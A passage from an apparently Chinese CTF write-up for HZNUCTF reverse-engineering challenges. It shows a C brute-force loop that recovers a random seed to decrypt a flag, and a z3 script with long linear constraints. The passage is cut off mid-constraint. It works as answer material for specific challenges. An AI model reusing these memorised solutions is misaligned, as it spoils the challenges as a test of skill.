class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x67</span>,<span class="number">0x22</span>,<span class="number">0x24</span>,<span class="number">0x6e</span>,<span class="number">0xcd</span>,<span class="number">0x2f</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> flag[] = <span class="string">&quot;HZNUCTF&#123;&#125;&quot;</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> tmp[<span class="number">100</span>];</span><br><span class="line">	tmp[<span class="number">42</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffffffff</span>; i++) &#123;  <span class="comment">//爆破随机数</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">42</span>; j++) &#123;</span><br><span class="line">			tmp[j] = mm[j];</span><br><span class="line">		&#125;</span><br><span class="line">		enc_dec(key, tmp,i);</span><br><span class="line">		<span class="keyword">if</span> (tmp[<span class="number">0</span>] == flag[<span class="number">0</span>] &amp;&amp; tmp[<span class="number">1</span>] == flag[<span class="number">1</span>] &amp;&amp;tmp[<span class="number">2</span>] == flag[<span class="number">2</span>] &amp;&amp; tmp[<span class="number">3</span>] == flag[<span class="number">3</span>])</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;delta:%d\n&quot;</span>, i);</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, mm[i]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n%s&quot;</span>, tmp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="蛇年的本命语言"><strong>蛇年的本命语言</strong></h3>
<p>z3解一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">i11i1Iii1I1 =<span class="built_in">list</span>(Int(<span class="string">f&quot;a_<span class="subst">&#123;i&#125;</span>&quot;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>))</span><br><span class="line">ii1iIi1i11i = [</span><br><span class="line">    <span class="number">7</span> * i11i1Iii1I1[<span class="number">0</span>] == <span class="number">504</span>,</span><br><span class="line">    <span class="number">9</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">5</span> * i11i1Iii1I1[<span class="number">1</span>] == <span class="number">403</span>,</span><br><span class="line">    (<span class="number">2</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">5</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">10</span> * i11i1Iii1I1[<span class="number">2</span>] == <span class="number">799</span>,</span><br><span class="line">    <span class="number">3</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">8</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">3</span>] == <span class="number">2938</span>,</span><br><span class="line">    (<span class="number">5</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">15</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">19</span> * i11i1Iii1I1[<span class="number">3</span>]) + <span class="number">1</span> * i11i1Iii1I1[<span class="number">4</span>] == <span class="number">2042</span>,</span><br><span class="line">    (<span class="number">7</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">3</span>]) + <span class="number">2</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">5</span> * i11i1Iii1I1[<span class="number">5</span>] == <span class="number">1225</span>,</span><br><span class="line">    <span class="number">11</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">33</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">44</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">77</span> * i11i1Iii1I1[<span class="number">6</span>] == <span class="number">7975</span>,</span><br><span class="line">    ((<span class="number">21</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">24</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">6</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">7</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">15</span> * i11i1Iii1I1[<span class="number">7</span>] == <span class="number">229</span>,</span><br><span class="line">    (<span class="number">2</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">65</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">15</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">20</span> * i11i1Iii1I1[<span class="number">8</span>] == <span class="number">2107</span>,</span><br><span class="line">    (<span class="number">10</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">1</span>] + -<span class="number">9</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">22</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">8</span>]) + <span class="number">30</span> * i11i1Iii1I1[<span class="number">9</span>] == <span class="number">4037</span>,</span><br><span class="line">    (<span class="number">15</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">59</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">56</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">122</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">21</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">32</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>] == <span class="number">4950</span>,</span><br><span class="line">    (((<span class="number">13</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">39</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">33</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">13</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">42</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">62</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>]) + <span class="number">11</span> * i11i1Iii1I1[<span class="number">11</span>] == <span class="number">12544</span>,</span><br><span class="line">    (((<span class="number">23</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">63</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">25</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">2</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">32</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">10</span>]) + <span class="number">11</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>] == <span class="number">6585</span>,</span><br><span class="line">    ((((<span class="number">223</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">29</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">53</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">3</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">65</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">0</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">10</span>]) + <span class="number">16</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">13</span> * i11i1Iii1I1[<span class="number">13</span>] == <span class="number">6893</span>,</span><br><span class="line">    ((((<span class="number">29</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">13</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">9</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">93</span> * i11i1Iii1I1[<span class="number">3</span>]) + <span class="number">33</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>]) + <span class="number">0</span> * i11i1Iii1I1[<span class="number">9</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">10</span>]) + <span class="number">96</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">68</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">33</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">14</span> * i11i1Iii1I1[<span class="number">14</span>] == <span class="number">1883</span>,</span><br><span class="line">    (((<span class="number">69</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">77</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">93</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">3</span>]) + <span class="number">0</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">8</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">9</span>] + <span class="number">19</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">8</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">38</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">14</span>]) + <span class="number">15</span> * i11i1Iii1I1[<span class="number">15</span>] == <span class="number">8257</span>,</span><br><span class="line">    ((((<span class="number">23</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">3</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">3</span>]) + <span class="number">12</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">24</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">1</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">14</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">1</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">68</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">68</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">14</span>]) + <span class="number">15</span> * i11i1Iii1I1[<span class="number">15</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">16</span>] == <span class="number">5847</span>,</span><br><span class="line">    (((((<span class="number">24</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">2</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">3</span>]) + <span class="number">13</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">67</span> * i11i1Iii1I1[<span class="number">7</span>] + <span class="number">146</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">50</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">16</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">27</span> * i11i1Iii1I1[<span class="number">14</span>]) + <span class="number">45</span> * i11i1Iii1I1[<span class="number">15</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>]) + <span class="number">17</span> * i11i1Iii1I1[<span class="number">17</span>] == <span class="number">18257</span>,</span><br><span class="line">    ((((<span class="number">25</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] - <span class="number">89</span> * i11i1Iii1I1[<span class="number">2</span>]) + <span class="number">16</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">19</span> * i11i1Iii1I1[<span class="number">4</span>] + <span class="number">44</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">36</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">150</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">250</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">166</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">126</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">11</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">690</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">207</span> * i11i1Iii1I1[<span class="number">14</span>]) + <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">18</span>] == <span class="number">12591</span>,</span><br><span class="line">    (((((<span class="number">5</span> * i11i1Iii1I1[<span class="number">0</span>] + <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>] + <span class="number">8</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">160</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">9</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>]) + <span class="number">36</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">15</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">66</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">16</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">690</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">14</span>]) + <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">7</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">18</span> * i11i1Iii1I1[<span class="number">18</span>]) + <span class="number">19</span> * i11i1Iii1I1[<span class="number">19</span>] == <span class="number">52041</span>,</span><br><span class="line">    ((((((<span class="number">29</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">0</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">60</span> * i11i1Iii1I1[<span class="number">3</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">4</span>] - <span class="number">4</span> * i11i1Iii1I1[<span class="number">5</span>]) + <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">16</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">21</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">69</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">46</span> * i11i1Iii1I1[<span class="number">15</span>]) + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">0</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">1</span> * i11i1Iii1I1[<span class="number">18</span>]) + <span class="number">39</span> * i11i1Iii1I1[<span class="number">19</span>] - <span class="number">20</span> * i11i1Iii1I1[<span class="number">20</span>] == <span class="number">20253</span>,</span><br><span class="line">    (((((((<span class="number">45</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">56</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">10</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">650</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">900</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">44</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">21</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">12</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">69</span> * i11i1Iii1I1[<span class="number">13</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">406</span> * i11i1Iii1I1[<span class="number">15</span>]) + <span class="number">651</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">2</span> * i11i1Iii1I1[<span class="number">17</span>] - <span class="number">10</span> * i11i1Iii1I1[<span class="number">18</span>]) + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] - <span class="number">0</span> * i11i1Iii1I1[<span class="number">20</span>]) + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] == <span class="number">18768</span>,</span><br><span class="line">    (((((<span class="number">555</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">6666</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">70</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">510</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">90</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">499</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">6</span>] - <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">610</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">221</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">23</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">102</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">6</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2050</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">406</span> * i11i1Iii1I1[<span class="number">15</span>]) + <span class="number">665</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">333</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">201</span> * i11i1Iii1I1[<span class="number">21</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">22</span>] == <span class="number">111844</span>,</span><br><span class="line">    (((((((<span class="number">1</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4444</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">5555</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">676</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">660</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">9</span> * i11i1Iii1I1[<span class="number">10</span>] - <span class="number">73</span> * i11i1Iii1I1[<span class="number">11</span>] - <span class="number">107</span> * i11i1Iii1I1[<span class="number">12</span>]) + <span class="number">6</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">15</span>]) + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">39</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">10</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">69</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">201</span> * i11i1Iii1I1[<span class="number">21</span>] - <span class="number">2</span> * i11i1Iii1I1[<span class="number">22</span>]) + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] == <span class="number">159029</span>,</span><br><span class="line">    (((<span class="number">520</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">222</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">56655</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">73</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">1007</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">7777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2500</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">605</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">390</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">99999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">210</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>] == <span class="number">2762025</span>,</span><br><span class="line">    ((((<span class="number">1323</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">333</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">666</span> * i11i1Iii1I1[<span class="number">5</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">6</span>] + <span class="number">66</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">660</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">2500</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">6666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">605</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">390</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">9999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">210</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>]) + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] == <span class="number">1551621</span>,</span><br><span class="line">    (((((<span class="number">777</span> * i11i1Iii1I1[<span class="number">0</span>] - <span class="number">22</span> * i11i1Iii1I1[<span class="number">1</span>]) + <span class="number">6969</span> * i11i1Iii1I1[<span class="number">2</span>] + <span class="number">4</span> * i11i1Iii1I1[<span class="number">3</span>] - <span class="number">55</span> * i11i1Iii1I1[<span class="number">4</span>]) + <span class="number">666</span> * i11i1Iii1I1[<span class="number">5</span>] - <span class="number">6</span> * i11i1Iii1I1[<span class="number">6</span>]) + <span class="number">96</span> * i11i1Iii1I1[<span class="number">7</span>] - <span class="number">60</span> * i11i1Iii1I1[<span class="number">8</span>] - <span class="number">220</span> * i11i1Iii1I1[<span class="number">9</span>]) + <span class="number">99</span> * i11i1Iii1I1[<span class="number">10</span>] + <span class="number">3</span> * i11i1Iii1I1[<span class="number">11</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">12</span>] + <span class="number">777</span> * i11i1Iii1I1[<span class="number">13</span>] + <span class="number">250</span> * i11i1Iii1I1[<span class="number">14</span>] + <span class="number">666</span> * i11i1Iii1I1[<span class="number">15</span>] + <span class="number">65</span> * i11i1Iii1I1[<span class="number">16</span>] + <span class="number">90</span> * i11i1Iii1I1[<span class="number">17</span>] + <span class="number">100</span> * i11i1Iii1I1[<span class="number">18</span>] + <span class="number">609</span> * i11i1Iii1I1[<span class="number">19</span>] + <span class="number">999</span> * i11i1Iii1I1[<span class="number">20</span>] + <span class="number">21</span> * i11i1Iii1I1[<span class="number">21</span>] + <span class="number">232</span> * i11i1Iii1I1[<span class="number">22</span>] + <span class="number">23</span> * i11i1Iii1I1[<span class="number">23</span>] - <span class="number">24</span> * i11i1Iii1I1[<span class="number">24</span>]) + <span class="number">25</span> * i11i1Iii1I1[<span class="number">25</span>] - <span class="number">26</span> * i11i1Iii1I1[<span class="number">26</span>] == <span class="number">948348</span>,</span><br><span 